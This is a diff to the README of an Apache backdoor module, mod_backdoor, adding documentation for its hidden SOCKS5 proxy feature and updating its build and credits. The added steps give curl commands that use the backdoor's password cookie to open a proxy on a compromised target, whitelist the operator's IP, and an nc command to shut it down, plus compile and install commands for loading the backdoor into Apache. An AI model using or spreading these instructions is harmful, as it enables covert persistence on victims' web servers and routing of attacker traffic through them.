@@ -64,7 +64,20 @@ PHP uses the `exec` function.<br/>
 Ruby isn't using `/bin/sh`.
 
 ### Socks5 proxy
-TODO
+The code comes from https://github.com/rofl0r/microsocks <br/>
+The endpoint `http[s]://<TARGET>/proxy/<PORT>/<USER>` opens a socks5 proxy on `<PORT>`. 
+`<USER>` is optional. If you set it, it activates the auth mode. Password is the same as the mod_backdoor.<br/>
+Once a specific ip address authed successfully with user/pass, it is added to a whitelist and may use the proxy without auth. 
+This is handy for programs like firefox that don't support user/pass auth. 
+For it to work you'd basically make one connection with another program that supports it, and then you can use firefox too.<br/>
+Example:<br/>
+1. `curl -H 'Cookie: password=backdoor' http://<TARGET>/proxy/1337/vlad` <br/>
+--> Start socks proxy on port 1337 for `vlad` user 
+2. `curl -x socks5://vlad:password=backdoor@<TARGET>:1337 https://www.google.com` <br/>
+--> Register your IP address
+3. You could now use it without auth
+4. When you're done, you can kill the socks proxy by sending `imdonewithyou` in a new socket <br/>
+--> `echo "imdonewithyou" | nc <TARGET> 1337`
 
 ### Ping module
 The endpoint `http[s]://<TARGET>/ping` tells you if the module is currently working.
@@ -75,13 +88,13 @@ More info about Ringbuilder:<br/>
 https://github.com/TarlogicSecurity/mod_ringbuilder <br/>
 https://www.tarlogic.com/en/blog/backdoors-modulos-apache/ <br/>
 
-Socks5 code was adapted from https://github.com/fgssfgss/socks_proxy <br/>
+Socks5 code was adapted from https://github.com/rofl0r/microsocks <br/>
 <br/>
 Special thanks to [@Ug_0Security](https://twitter.com/Ug_0Security)
 
 # Builds
 For development :<br/>
-* `apxs -i -a -c mod_backdoor.c -Wl,-lutil` <br/>
+* `apxs -i -a -c mod_backdoor.c sblist.c sblist_delete.c server.c -Wl,-lutil` <br/>
  -Wl,-lutil used to link mod_backdoor.so with libutil.so to use forkpty() from <pty.h>
 * `systemctl restart apache2`
 
